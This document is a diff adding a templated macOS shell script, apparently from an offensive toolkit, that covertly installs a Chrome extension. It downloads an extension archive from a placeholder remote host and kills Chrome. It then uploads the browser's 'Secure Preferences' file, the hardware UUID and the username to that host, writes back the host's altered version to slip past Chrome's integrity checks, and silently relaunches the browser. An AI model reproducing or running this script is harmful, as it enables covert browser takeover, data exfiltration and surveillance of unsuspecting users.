@@ -1,0 +1,35 @@
+hostname="#HOSTNAME#"
+extension="#EXTENSION_NAME#"
+extension_path="$HOME/#EXTENSION_PATH#"
+os="macos"
+
+chrome="Google Chrome"
+
+# Check if Chrome is installed
+if [ -d "/Applications/$chrome.app" ]; then
+
+    # Change to extension directory
+    cd "$extension_path"
+
+    # Download Extension
+    zipfile="$extension.zip"
+    rm -f $zipfile
+    curl -s#CERT_CHECK# https://$hostname/download/extension/$zipfile -o $zipfile
+    unzip -o -qq $zipfile
+    rm -f $zipfile
+
+    # Kill Google Chrome
+    killall "$chrome" &> /dev/null
+    sleep 1
+
+    # Update Secure Preferences File
+    cd
+    sid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/UU/{print $4}')
+    spf="$extension_path/Secure Preferences"
+    curl -s#CERT_CHECK# -F "file=@$spf" -o "$spf" "https://$hostname/upload/?extension=$extension&os=$os&sid=$sid&user=$USER"
+
+    # Open Google Chrome
+    sleep 1
+    open -a "$chrome" --args --restore-last-session --noerrdialogs
+
+fi
